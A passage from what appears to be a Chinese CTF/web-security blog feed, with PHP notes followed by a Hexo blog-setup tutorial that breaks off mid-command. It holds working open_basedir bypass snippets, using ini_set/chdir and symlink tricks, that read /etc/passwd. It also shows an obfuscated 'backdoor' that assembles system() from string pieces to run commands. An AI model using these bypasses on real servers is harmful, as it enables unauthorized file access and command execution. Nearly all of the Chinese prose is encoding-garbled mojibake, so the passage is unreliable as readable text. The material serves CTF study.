ä¸­çš„ä¸€ä¸ªé…ç½®é€‰é¡¹ï¼Œç”¨äºé™åˆ¶è„šæœ¬å¯ä»¥è®¿é—®çš„æ–‡ä»¶ç³»ç»Ÿè·¯å¾„èŒƒå›´ã€‚</p></li><li><p>ä¾‹å­ <code>open_basedir = /var/www/html/:/tmp/</code>   PHP è„šæœ¬åªèƒ½è®¿é—® <code>/var/www/html/</code> ç›®å½•åŠå…¶å­ç›®å½•ï¼Œå’Œ <code>/tmp/</code> ç›®å½•ã€‚</p></li><li><p>php.ini æ–‡ä»¶ä¸­è®¾ç½® <code>open_basedir</code> é€‰é¡¹ã€‚</p></li><li><p><strong>ç»•è¿‡æ–¹æ³•</strong>ï¼š</p><ul><li>åˆ©ç”¨ <code>ini_set</code> å’Œ <code>chdir</code>ï¼ŒPHP é…ç½®ä¸­æœªç¦ç”¨ <code>ini_set</code> çš„ä½¿ç”¨ã€‚</li></ul><p>å‚è€ƒï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;subDir&#x27;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><ul><li><strong>åˆ©ç”¨ <code>symlink</code></strong><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&#x27;/var/www/html/a/b/c/d/e/f/g/&#x27;</span>,<span class="hljs-number">0777</span>,<span class="hljs-literal">TRUE</span>);<br><span class="hljs-title function_ invoke__">symlink</span>(<span class="hljs-string">&#x27;/var/www/html/a/b/c/d/e/f/g&#x27;</span>,<span class="hljs-string">&#x27;foo&#x27;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/var/www/html:bar/&#x27;</span>);<br><span class="hljs-title function_ invoke__">symlink</span>(<span class="hljs-string">&#x27;foo/../../../../../../&#x27;</span>,<span class="hljs-string">&#x27;bar&#x27;</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;foo&#x27;</span>);<br><span class="hljs-title function_ invoke__">symlink</span>(<span class="hljs-string">&#x27;/var/www/html&#x27;</span>,<span class="hljs-string">&#x27;foo&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;bar/etc/passwd&#x27;</span>);<br></code></pre></td></tr></table></figure></li></ul></li></ul><ol start="5"><li><strong>PHP æ˜¯ä¸€é—¨åŠ¨æ€è¯­è¨€</strong></li></ol><ul><li>åŠ¨æ€è¯­è¨€æŒ‡åœ¨è¿è¡Œæ—¶ç¡®å®šæ•°æ®ç±»å‹çš„è¯­è¨€ï¼Œå®ƒæ‹¥æœ‰ä¸€äº›ç‹¬ç‰¹çš„ç‰¹æ€§å¦‚ï¼šåŠ¨æ€å˜é‡ã€åŠ¨æ€å‡½æ•°æ‰§è¡Œç­‰ã€‚</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] = <span class="hljs-string">&#x27;cc&#x27;</span>;<br><span class="hljs-comment">#$a æ˜¯ $_GET çš„ä¸­é—´å˜é‡ï¼Œ$_GET æ˜¯æœ€ç»ˆå˜é‡</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;_GET&#x27;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$$a</span>); <span class="hljs-comment">//ç¬¬ä¸€ä¸ª$æ˜¯æ‰¾åˆ°$aæ˜¯_GETç¬¬äºŒä¸ªæ˜¯æ‰¾åˆ°$_GET æƒ³$this</span><br><br><span class="hljs-variable">$_POST</span> = <span class="hljs-string">&#x27;asdf&#x27;</span>;<br><span class="hljs-variable">$asdf</span> = <span class="hljs-string">&#x27;ccc&#x27;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$$_POST</span>);<br></code></pre></td></tr></table></figure><ul><li><p><strong>å¯å˜å±æ€§å</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$bar</span> = <span class="hljs-string">&#x27;I am bar.&#x27;</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;I am A.&#x27;</span>, <span class="hljs-string">&#x27;I am B.&#x27;</span>, <span class="hljs-string">&#x27;I am C.&#x27;</span>);<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$r</span>   = <span class="hljs-string">&#x27;I am r.&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$foo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">foo</span>();<br><span class="hljs-variable">$bar</span> = <span class="hljs-string">&#x27;bar&#x27;</span>;<br><span class="hljs-variable">$baz</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;foo&#x27;</span>, <span class="hljs-string">&#x27;bar&#x27;</span>, <span class="hljs-string">&#x27;baz&#x27;</span>, <span class="hljs-string">&#x27;quux&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$foo</span>-&gt;<span class="hljs-variable">$bar</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$foo</span>-&gt;&#123;<span class="hljs-variable">$baz</span>[<span class="hljs-number">1</span>]&#125; . <span class="hljs-string">&quot;\n&quot;</span>;   <span class="hljs-comment">// ç­‰åŒäº $foo-&gt;barã€‚å› æ­¤ï¼Œè¾“å‡ºç»“æœä¹Ÿæ˜¯ &#x27;I am bar.&#x27;</span><br><br><span class="hljs-variable">$start</span> = <span class="hljs-string">&#x27;b&#x27;</span>;<br><span class="hljs-variable">$end</span>   = <span class="hljs-string">&#x27;ar&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$foo</span>-&gt;&#123;<span class="hljs-variable">$start</span>.<span class="hljs-variable">$end</span>&#125; . <span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-variable">$arr</span> = <span class="hljs-string">&#x27;arr&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$foo</span>-&gt;&#123;<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>]&#125; . <span class="hljs-string">&quot;\n&quot;</span>; <span class="hljs-comment">// æ‰€ä»¥ $foo-&gt;&#123;$arr[1]&#125; å®é™…ä¸Šæ˜¯  $foo-&gt;r</span><br></code></pre></td></tr></table></figure></li><li><p><strong>å¯å˜å˜é‡</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;b&#x27;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;c&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$$a</span>;<br><span class="hljs-keyword">echo</span> $&#123;<span class="hljs-variable">$a</span>&#125;;  <br></code></pre></td></tr></table></figure></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;b&#x27;</span>;<br><span class="hljs-variable">$ab</span> = <span class="hljs-string">&#x27;cccc&#x27;</span>;<br><span class="hljs-keyword">echo</span> $&#123;<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>&#125;;<br></code></pre></td></tr></table></figure><ul><li><strong>åŠ¨æ€å‡½æ•°</strong><ol><li><p><strong>åŠ¨æ€æ‰§è¡Œå‡½æ•°</strong></p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;phPinfo&#x27;</span>; <span class="hljs-comment">#php çš„å‡½æ•°å¿½ç•¥å¤§å°å†™ï¼Œä½†æ˜¯å˜é‡ä¸¥æ ¼å¤§å°å†™ï¼Œè¿™æ ·å†™æ²¡é—®é¢˜ è€Œä¸”ç›´æ¥è°ƒç”¨ PHpinfo ä¹Ÿä¸ä¼šæŠ¥é”™</span><br><span class="hljs-variable">$a</span>();<br></code></pre></td></tr></table></figure></li><li><p><strong>åŠ¨æ€å®ä¾‹åŒ–ç±»</strong></p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cc</span></span>&#123;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;cc&#x27;</span>;<br><span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>();<br></code></pre></td></tr></table></figure></li><li><p><strong>å¯å˜å‡½æ•°åé—¨</strong></p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;1&#x27;</span>]<br><br><br><br>```<span class="hljs-title function_ invoke__">php</span><br>(<span class="hljs-string">&#x27;sys&#x27;</span>.<span class="hljs-string">&#x27;tem&#x27;</span>)(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br><span class="hljs-title function_ invoke__">join</span>(<span class="hljs-string">&quot;&quot;</span>,[<span class="hljs-string">&quot;sys&quot;</span>,<span class="hljs-string">&quot;tem&quot;</span>])(<span class="hljs-string">&quot;ipconfig&quot;</span>);<br><span class="hljs-title function_ invoke__">implode</span>([<span class="hljs-string">&#x27;sys&#x27;</span>,<span class="hljs-string">&#x27;tem&#x27;</span>])(<span class="hljs-string">&quot;ipconfig&quot;</span>);<br></code></pre></td></tr></table></figure></li></ol></li></ul><ol start="6"><li><strong>æ·±å…¥ç†è§£ <code>$_REQUEST</code> æ•°ç»„</strong></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br></code></pre></td></tr></table></figure><ul><li>è¿™è¡Œä»£ç ä¼šè¾“å‡º <code>$_REQUEST</code> æ•°ç»„ä¸­é”®ä¸º â€˜aâ€™ çš„å€¼ã€‚<code>$_REQUEST</code> æ˜¯ä¸€ä¸ªåŒ…å«äº† <code>$_GET</code>ã€<code>$_POST</code> å’Œ <code>$_COOKIE</code> æ•°æ®çš„æ•°ç»„ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒçš„é¡ºåºæ˜¯å…ˆå¤„ç† <code>$_POST</code>ï¼Œç„¶åæ˜¯ <code>$_GET</code>ï¼Œæœ€åæ˜¯ <code>$_COOKIE</code>ã€‚</li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>phpä»£ç å®¡è®¡</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç»•è¿‡Disable_function</title>
    <link href="/2024/08/31/%E7%BB%95%E8%BF%87Disable-function/"/>
    <url>/2024/08/31/%E7%BB%95%E8%BF%87Disable-function/</url>
    
    <content type="html"><![CDATA[<h1 id="ç»•è¿‡Disable-function"><a href="#ç»•è¿‡Disable-function" class="headerlink" title="ç»•è¿‡Disable_function"></a>ç»•è¿‡Disable_function</h1><p><a href="https://xz.aliyun.com/t/10057">https://xz.aliyun.com/t/10057</a></p><p><a href="https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass">https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass</a></p><p><a href="https://christa.top/details/21/">https://christa.top/details/21/</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>rce</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¦‚ä½•æ­å»ºä¸€ç¯‡åšå®¢2024ç‰ˆ</title>
    <link href="/2024/08/30/%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A22024%E7%89%88/"/>
    <url>/2024/08/30/%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A22024%E7%89%88/</url>
    
    <content type="html"><![CDATA[<h2 id="ä¸€ï¼šç¯å¢ƒå’Œå·¥å…·å‡†å¤‡ï¼š"><a href="#ä¸€ï¼šç¯å¢ƒå’Œå·¥å…·å‡†å¤‡ï¼š" class="headerlink" title="ä¸€ï¼šç¯å¢ƒå’Œå·¥å…·å‡†å¤‡ï¼š"></a>ä¸€ï¼šç¯å¢ƒå’Œå·¥å…·å‡†å¤‡ï¼š</h2><p>1.ç³»ç»Ÿï¼ˆWindows10 11ï¼‰<br>2.Node js<br>3.Git<br>4.hexo<br>5.æ–‡æœ¬ç¼–è¾‘å™¨<br>6.ä¸€ä¸ªGithubè´¦å·</p><h2 id="äºŒ-Node-jsçš„å®‰è£…ï¼š"><a href="#äºŒ-Node-jsçš„å®‰è£…ï¼š" class="headerlink" title="äºŒ.Node jsçš„å®‰è£…ï¼š"></a>äºŒ.Node jsçš„å®‰è£…ï¼š</h2><p>1.æ‰“å¼€Nodeå®˜ç½‘ï¼Œä¸‹è½½Node jså®‰è£…ç¨‹åºï¼Œä¸‹è½½åœ°å€ï¼š<a href="https://nodejs.org/en/download/">https://nodejs.org/en/download/</a><br>2.ä¸‹è½½åå®‰è£…ï¼Œå®‰è£…ç›®å½•å°½é‡é»˜è®¤ï¼Œé™¤éä½ å¯¹å®ƒéå¸¸äº†è§£ã€‚<br>3.å®‰è£…å®Œæˆåï¼Œæ£€æŸ¥æ˜¯å¦å®‰è£…æˆåŠŸã€‚æ‰“å¼€cmdçª—å£ï¼Œè¾“å…¥ï¼šnode -vï¼Œçœ‹åˆ°äº†<br>ç‰ˆæœ¬ä¿¡æ¯ï¼Œä»£è¡¨å®‰è£…æˆåŠŸã€‚<br>4.ä¿®æ”¹ä¸‹è½½æºã€‚npmä¸‹è½½å„ç§æ¨¡å—ï¼Œé»˜è®¤æ˜¯ä»å›½å¤–çš„æœåŠ¡å™¨ä¸‹è½½ï¼Œé€Ÿåº¦è¾ƒæ…¢ï¼ŒæŠŠå®ƒæ¢æˆå›½å†…é•œåƒï¼Œæ‰“å¼€cmdçª—å£ï¼Œè¿è¡Œå‘½ä»¤ï¼šnpm config set registry <a href="https://registry.npm.taobao.org/">https://registry.npm.taobao.org</a></p><p>å›½å†…è®¿é—® npm å®˜æ–¹æºå¯èƒ½ä¼šæœ‰é€Ÿåº¦è¾ƒæ…¢æˆ–è€…ä¸ç¨³å®šçš„é—®é¢˜ï¼Œå¯ä»¥åˆ‡æ¢åˆ°å›½å†…é•œåƒæºï¼Œå¦‚æ·˜å®é•œåƒï¼š</p><p>npm config set registry <a href="https://registry.npmmirror.com/">https://registry.npmmirror.com/</a></p><h2 id="ä¸‰-å®‰è£…Gitï¼š"><a href="#ä¸‰-å®‰è£…Gitï¼š" class="headerlink" title="ä¸‰.å®‰è£…Gitï¼š"></a>ä¸‰.å®‰è£…Gitï¼š</h2><p>1.è¿›å…¥å®˜ç½‘ï¼š<a href="https://git-scm.com/downloads">https://git-scm.com/downloads</a> ï¼Œç”±äºå®˜ç½‘ä¸‹è½½å¤ªæ…¢å¯ä»¥é€šè¿‡æ·˜å®çš„å¼€æºé•œåƒä¸‹è½½ ç½‘å€ï¼š<a href="https://registry.npmmirror.com/binary.html?path=git-for-windows/v2.36.1.windows.1/">https://registry.npmmirror.com/binary.html?path=git-for-windows/v2.36.1.windows.1/</a><br>2.ä¸‹è½½åå‚»ç“œå¼å®‰è£…å³å¯ï¼Œå®‰è£…ç›®å½•å¯ä»¥é»˜è®¤ï¼Œå¯ä»¥è‡ªé€‰ã€‚<br>3.åœ¨æ¡Œé¢å³é”®ï¼Œå‡ºç°Open Git Bash hereå³ä»£è¡¨å®‰è£…æˆåŠŸã€‚</p><h2 id="å››-å®‰è£…Hexoï¼š"><a href="#å››-å®‰è£…Hexoï¼š" class="headerlink" title="å››.å®‰è£…Hexoï¼š"></a>å››.å®‰è£…Hexoï¼š</h2><p>1.å³é”®Git Bashè¾“å…¥å¦‚ä¸‹å‘½ä»¤å®‰è£…ï¼šnpm install -g hexo-cli<br>2.å®‰è£…å®Œåè¾“å…¥hexo -véªŒè¯ï¼Œå‡ºç°ç‰ˆæœ¬å·å³ä»£è¡¨æˆåŠŸã€‚</p><h2 id="äº”-Githubä¸ä»“åº“çš„åˆ›å»º"><a href="#äº”-Githubä¸ä»“åº“çš„åˆ›å»º" class="headerlink" title="äº”.Githubä¸ä»“åº“çš„åˆ›å»º"></a>äº”.Githubä¸ä»“åº“çš„åˆ›å»º</h2><p>1.è¿›å…¥å®˜ç½‘ï¼š<a href="https://github.com/">https://github.com/</a><br>2.ç‚¹å‡»å³ä¸Šè§’Sign upè¿›è¡Œæ³¨å†Œï¼š<br>3.å¡«å†™è‡ªå·±çš„é‚®ç®±ã€å¯†ç ã€ç”¨æˆ·åç­‰ä¿¡æ¯ï¼Œç„¶åç”¨é‚®ç®±éªŒè¯å³å¯å®Œæˆã€‚<br>4.æ³¨å†Œå®Œæˆåï¼Œç‚¹å‡»å³ä¸Šè§’+æŒ‰é’®ï¼Œé€‰æ‹©New repositoryï¼Œåˆ›å»ºä¸€ä¸ªåç§°ä¸ºç”¨æˆ·å.github.io<br>çš„ä»“åº“ã€‚</p><p>æ³¨æ„ï¼š1.åç§°å¿…é¡»ä¸ºä½ çš„ç”¨æˆ·å.github.io,ä¸ç„¶ä¼š404<br>â€ƒâ€ƒ2.Descriptionï¼šä¸ºæè¿°ä»“åº“ã€‚ï¼ˆé€‰å¡«ï¼‰<br>â€ƒâ€ƒ3.å‹¾é€‰ Initialize this repository with a README åˆå§‹åŒ–ä¸€ä¸ª README.mdæ–‡ä»¶ã€‚<br>â€ƒâ€ƒ4.ç‚¹å‡» Creat repository è¿›è¡Œåˆ›å»ºã€‚</p><h2 id="å…­-ç¯å¢ƒé…ç½®ï¼š"><a href="#å…­-ç¯å¢ƒé…ç½®ï¼š" class="headerlink" title="å…­.ç¯å¢ƒé…ç½®ï¼š"></a>å…­.ç¯å¢ƒé…ç½®ï¼š</h2><p>1.é…ç½®ç”¨æˆ·åå’Œé‚®ç®±ï¼š<br><code>git config --global user.name &quot;ä½ çš„ç”¨æˆ·å&quot; git config --global user.email &quot;ä½ çš„é‚®ç®±&quot;</code><br>2.é€šè¿‡ <code>git config -l</code>æ£€æŸ¥æ˜¯å¦é…ç½®æˆåŠŸï¼Œç°åœ¨gitå®‰è£…åŠé…ç½®å…¨éƒ¨å®Œæˆã€‚</p><h2 id="ä¸ƒ-è¿æ¥è‡³Githubï¼š"><a href="#ä¸ƒ-è¿æ¥è‡³Githubï¼š" class="headerlink" title="ä¸ƒ.è¿æ¥è‡³Githubï¼š"></a>ä¸ƒ.è¿æ¥è‡³Githubï¼š</h2><p>1.æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ç”Ÿæˆsshå…¬é’¥ï¼Œå®ƒç”¨äºä½ çš„è®¡ç®—æœºè¿æ¥Githubã€‚<br><code>ssh-keygen -t rsa -C &quot;ä½ çš„é‚®ç®±&quot;</code></p><p>2.å°† SSH KEY é…ç½®åˆ° GitHub<br>è¿›å…¥Githubï¼Œç‚¹å‡»å³ä¸Šè§’å¤´åƒï¼Œé€‰æ‹©settingsï¼Œè¿›å…¥è®¾ç½®åé€‰æ‹© SSH and GPG keysï¼Œ<br>åå­—å°½é‡å†™è‹±æ–‡çš„ï¼ŒæŠŠåˆšæ‰å¤åˆ¶çš„å…¬é’¥å¡«åˆ° Key é‚£ä¸€æ ã€‚å®Œæˆåä¿å­˜ã€‚</p><p>3.æµ‹è¯•è¿æ¥ï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š<br><code>ssh -T git@github.com</code><br>å‡ºç°è¿æ¥åˆ°è´¦æˆ·çš„æç¤ºä¿¡æ¯ï¼Œè¯´æ˜å¤§åŠŸå‘Šæˆï¼Œç°åœ¨å®Œæˆäº†ç¯å¢ƒå‡†å¤‡å·¥ä½œã€‚</p><h2 id="å…«-åˆå§‹åŒ–Hexoé¡¹ç›®"><a href="#å…«-åˆå§‹åŒ–Hexoé¡¹ç›®" class="headerlink" title="å…«.åˆå§‹åŒ–Hexoé¡¹ç›®"></a>å…«.åˆå§‹åŒ–Hexoé¡¹ç›®</h2><p>1.åœ¨ä½ æƒ³æ”¾åšå®¢æ–‡ä»¶çš„è·¯å¾„æ‰“å¼€GBHï¼Œæ‰§è¡Œä¸‹åˆ—å‘½ä»¤åˆå§‹åŒ–é¡¹ç›®ã€‚ï¼ˆæŠŠblogåé¢çš„ä¸œè¥¿åˆ æ‰ï¼‰<br><code>hexo init blog(é¡¹ç›®å)</code><br>2.è¿›å…¥blogæ–‡ä»¶å¤¹ï¼Œå†æ¬¡å³é”®GBHï¼Œè¾“å…¥ <code>npm i</code>å®‰è£…ç›¸å…³ä¾èµ–ã€‚</p><p>3.å®‰è£…å®Œæˆåï¼Œblogæ–‡ä»¶å¤¹å†…æœ‰å¦‚ä¸‹ç»“æ„ï¼š<br>ã€node_modulesã€‘ï¼šä¾èµ–åŒ…<br>ã€scaffoldsã€‘ï¼šç”Ÿæˆæ–‡ç« çš„ä¸€äº›æ¨¡æ¿<br>ã€sourceã€‘ï¼šç”¨æ¥å­˜æ”¾ä½ çš„æ–‡ç« <br>ã€themesã€‘ï¼šä¸»é¢˜<br>ã€.npmignoreã€‘ï¼šå‘å¸ƒæ—¶å¿½ç•¥çš„æ–‡ä»¶ï¼ˆå¯å¿½ç•¥ï¼‰<br>ã€_config.landscape.ymlã€‘ï¼šä¸»é¢˜çš„é…ç½®æ–‡ä»¶<br>ã€config.ymlã€‘ï¼šåšå®¢çš„é…ç½®æ–‡ä»¶<br>ã€package.jsonã€‘ï¼šé¡¹ç›®åç§°ã€æè¿°ã€ç‰ˆæœ¬ã€è¿è¡Œå’Œå¼€å‘ç­‰ä¿¡æ¯</p><p>4.è¾“å…¥hexo så¯åŠ¨é¡¹ç›®</p><h2 id="ä¹-æ›´æ¢ä¸»é¢˜"><a href="#ä¹-æ›´æ¢ä¸»é¢˜" class="headerlink" title="ä¹.æ›´æ¢ä¸»é¢˜"></a>ä¹.æ›´æ¢ä¸»é¢˜</h2><p>githubï¼š<a href="https://github.com/fluid-dev/hexo-theme-fluid/blob/master/_config.yml">https://github.com/fluid-dev/hexo-theme-fluid/blob/master/_config.yml</a></p><h2 id="å-é¡µé¢ä¸ªæ€§åŒ–"><a href="#å-é¡µé¢ä¸ªæ€§åŒ–" class="headerlink" title="å.é¡µé¢ä¸ªæ€§åŒ–"></a>å.é¡µé¢ä¸ªæ€§åŒ–</h2><ol><li>æµè§ˆå™¨tabé¡µåç§°<br>ä¿®æ”¹æ ¹ç›®å½•ä¸‹ _config.yml ä¸­çš„ title å­—æ®µã€‚<br>subtitleä¸ºå‰¯æ ‡é¢˜<br>descriptionä¸ç”¨å¡«å†™<br>keywordså…³é”®è¯ï¼Œå¯ä¸å¡«å†™<br>authoråšå®¢æ‰€æœ‰è€…<br>languageè¯­è¨€ï¼Œä¸­å›½å¤§é™†ä½¿ç”¨zh-CN<br>timezoneä¸ç”¨å¡«å†™</li></ol><p>2.åšå®¢å¯¼èˆªæ å·¦ä¾§æ–‡å­—<br>blogç›®å½•ä¸‹_config.fluid.ymlä¸­çš„blog_title å­—æ®µã€‚</p><p>3.é¦–é¡µæ­£ä¸­é—´çš„æ–‡å­—<br>blogç›®å½•ä¸‹_config.fluid.ymlä¸­çš„textå­—æ®µã€‚</p><h2 id="åä¸€-å°†é™æ€åšå®¢æŒ‚è½½åˆ°Github-Pages"><a href="#åä¸€-å°†é™æ€åšå®¢æŒ‚è½½åˆ°Github-Pages" class="headerlink" title="åä¸€.å°†é™æ€åšå®¢æŒ‚è½½åˆ°Github Pages"></a>åä¸€.å°†é™æ€åšå®¢æŒ‚è½½åˆ°Github Pages</h2><p>æ–¹æ¡ˆä¸€ï¼ˆç„å­¦ï¼‰</p><p>1.å®‰è£… hexo-deployer-gitï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š<br><code>npm install hexo-deployer-git --save</code><br>2.ä¿®æ”¹æ ¹ç›®å½•ä¸‹çš„ _config.ymlï¼Œé…ç½® GitHub ç›¸å…³ä¿¡æ¯</p><p>deploy:<br>type: git<br>repository: <a href="https://github.com/XXX/XXX.github.io.git">https://github.com/XXX/XXX.github.io.git</a><br>branch: main<br>token: XXXXXXXXXXXXXï¼ˆè¦è·å–ï¼‰</p><p>repositoryè·å–æ–¹å¼ä¸ºï¼š<br>è¿›å…¥<a href="https://github.com/">https://github.com/</a>,<br>ç‚¹å‡»å³ä¸Šè§’ä¸‰æ¡æ ï¼Œç‚¹å‡»ä½ æ–°å»ºçš„ç”¨æˆ·å.github.ioçš„ä»“åº“<br>ç‚¹å‡»ä¸­é—´é‚£ä¸ªç»¿è‰²çš„CodeæŒ‰é’®ï¼Œé€‰æ‹©å·¦è¾¹çš„ Local ä¸‹é¢ä¸‰ä¸ªé€‰é¡¹é‡Œé€‰SSH,å¤åˆ¶é‚£ä¸ªé“¾æ¥å³å¯</p><p>å…¶ä¸­ token ä¸º GitHub çš„ Personal access tokensï¼Œè·å–æ–¹å¼å¦‚ä¸‹å›¾ï¼š<br>tokenåªä¼šå‡ºç°ä¸€æ¬¡ï¼Œå¤åˆ¶ä¸‹æ¥å¦¥å–„ä¿å­˜ï¼Œå¦‚æœä¸¢å¤±ï¼Œåˆ™è¦é‡æ–°ç”Ÿæˆã€‚</p><p>éƒ¨ç½²åˆ°Githubï¼š<br>å…ˆè¾“å…¥hexo cleanæ¸…é™¤ç¼“å­˜<br>å†è¾“å…¥å‘½ä»¤<code>hexo g -d</code></p><p>éƒ¨ç½²å®Œæˆåç­‰å¾…ä¸¤åˆ†é’Ÿï¼Œæµè§ˆå™¨è®¿é—®ï¼šhttps:&#x2F;&#x2F;ä½ çš„GitHubç”¨æˆ·å.github.io<br>èƒ½æ­£å¸¸è®¿é—®å³éƒ¨ç½²æˆåŠŸã€‚<br>ä½†æ˜¯å¾ˆç„å­¦ï¼Œæˆ‘ä¸Šè¯¾å‰è¿˜å¯ä»¥ï¼Œä¸‹è¯¾è¯•è¯•å°±ä¸å‡ºæ¥äº†ï¼Œå‘œå‘œå‘œ</p><h2 id="æˆ‘çš„æ–¹æ¡ˆï¼š"><a href="#æˆ‘çš„æ–¹æ¡ˆï¼š" class="headerlink" title="æˆ‘çš„æ–¹æ¡ˆï¼š"></a>æˆ‘çš„æ–¹æ¡ˆï¼š</h2><p>1.å®‰è£… hexo-deployer-gitï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š<br><code>npm install hexo-deployer-git 